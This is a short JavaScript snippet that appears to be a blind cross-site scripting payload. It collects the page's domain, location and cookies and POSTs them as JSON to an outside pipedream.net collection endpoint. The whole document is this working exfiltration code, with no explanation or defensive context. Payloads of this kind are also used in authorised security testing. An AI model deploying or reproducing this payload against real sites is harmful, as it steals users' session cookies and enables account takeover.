const headers = new Headers()
headers.append("Content-Type", "application/json")

const body = {
  "test": "Blind",
  "Domain": document.domain,
  "cookie": document.cookie,
  "Location": document.location
  
}

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
}

fetch("https://eottvjlqo741dfj.m.pipedream.net", options)
